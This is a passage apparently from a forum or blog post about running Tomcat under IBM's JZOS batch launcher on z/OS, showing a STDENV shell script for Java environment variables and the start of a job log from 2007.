ARGS='27800'&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>//STDENV DD *&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR># This is a shell script which configures&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR># any environment variables for the Java JVM.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR># Variables must be exported to be seen by the launcher.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>. /etc/profile&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>export JAVA_HOME=/usr/lpp/java/IBM/J1.4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>JZOS_HOME=/u/cntestd/java/jzos&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>export PATH=/bin:"${JAVA_HOME}"/bin:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>LIBPATH=/lib:/usr/lib:"${JAVA_HOME}"/bin:"${JZOS_HOME}"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>LIBPATH="$LIBPATH":"${JAVA_HOME}"/bin/classic&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>LIBPATH="$LIBPATH":"${JZOS_HOME}"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>export LIBPATH="$LIBPATH":&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>CLASSPATH="${JAVA_HOME}/lib/tools.jar"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp; </P>  <P>CLASSPATH="$CLASSPATH":"/u/cntestd/java/serverv1.3.2"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>CLASSPATH="$CLASSPATH":/u/cntestd/java/jzos/ibmjzos.jar&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>export CLASSPATH="$CLASSPATH":&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR># Set JZOS specific options&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR># Use this variable to specify encoding for DD STDOUT and STDERR&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>export JZOS_OUTPUT_ENCODING=IBM-1047&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR># Use this variable to prevent JZOS from handling MVS operator commands <BR>export JZOS_ENABLE_MVS_COMMANDS=false&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR># Use this variable to supply additional arguments to main&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>export JZOS_MAIN_ARGS=""&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR># Configure JVM options&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR># Note that Tomcat requires default ASCII file.encoding&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>IJO="-Xms64m -Xmx128m"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>IJO="$IJO -Dfile.encoding=ISO8859-1"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>IJO="$IJO -Dcatalina.base=${CATALINA_BASE}"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>IJO="$IJO -Dcatalina.home=${CATALINA_HOME}"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>IJO="$IJO -Djava.io.tmpdir=${CATALINA_BASE}/temp"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </P>  <P>IJO="$IJO -Djava.endorsed.dirs="&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>IJO="${IJO}${CATALINA_HOME}/common/endorsed"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR># Configure SDK5.0 to use shared classes (at group level)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR># You must comment this out if you are not running SDK 5&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>groupname=`id -gn`&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>#IJO="$IJO -Xshareclasses:name=$groupname,groupAccess"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>export IBM_JAVA_OPTIONS="$IJO "&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>export JAVA_DUMP_HEAP=false&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>export JAVA_PROPAGATE=NO&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>export IBM_JAVA_ZOS_TDUMP=NO&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>//&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </P>  <P>附2。ICH70001I CNTESTD&nbsp; LAST ACCESS AT 02:57:22 ON THURSDAY, DECEMBER 27, 2007&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>IEF236I ALLOC. FOR CNTESTDE JAVAJVM JAVA&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>IGD103I SMS ALLOCATED TO DDNAME STEPLIB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>IEF237I JES2 ALLOCATED TO SYSPRINT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>IEF237I JES2 ALLOCATED TO SYSOUT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>IEF237I JES2 ALLOCATED TO STDOUT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>IEF237I JES2 ALLOCATED TO STDERR&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>IEF237I JES2 ALLOCATED TO CEEDUMP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>IEF237I DMY&nbsp; ALLOCATED TO ABNLIGNR&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>IEF237I JES2 ALLOCATED TO STDENV&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>JVMJZBL1001N JZOS batch Launcher Version: 2.1.1 Alphaworks 2007-07-30&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>JVMJZBL1002N Copyright (C) IBM Corp. 2005. All rights 